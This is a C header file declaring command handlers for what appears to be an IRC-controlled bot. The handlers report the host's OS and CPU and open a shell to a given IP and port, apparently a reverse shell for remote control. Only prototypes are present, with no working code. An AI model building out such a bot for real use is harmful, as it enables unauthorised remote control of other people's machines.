#ifndef _COMMAND_H
#define _COMMAND_H

#ifdef _WIN32
#pragma once
#include "pch.h"
#include "irc.h"
#include "net.h"
#include <Windows.h>
#pragma comment(lib, "user32.lib")
#elif defined(__linux__)
// If needed
#include "net.h"
#elif defined(__APPLE__)
#include <sys/sysctl.h>
#include "net.h"
#endif

#define CPU_INFO_BUFFER_SIZE 128
#define OS_INFO_BUFFER_SIZE 128

#ifdef _WIN32
void handle_hello(int fd, CHAR *target);
#elif defined(__linux__) || defined(__APPLE__)
void handle_hello(int fd, char *target);
#endif

#ifdef _WIN32
void handle_os(int fd, CHAR *target);
#elif defined(__linux__) || defined(__APPLE__)
void handle_os(int fd, char *target);
#endif

#ifdef _WIN32
void handle_cpu(int fd, CHAR *target);
#elif defined(__linux__) || defined(__APPLE__)
void handle_cpu(int fd, char *target);
#endif

#ifdef _WIN32
void handle_shell(int fd, CHAR *target, CHAR *ip, int port);
#elif defined(__linux__) || defined(__APPLE__)
void handle_shell(int fd, char *target, char *ip, int port);
#endif

#endif
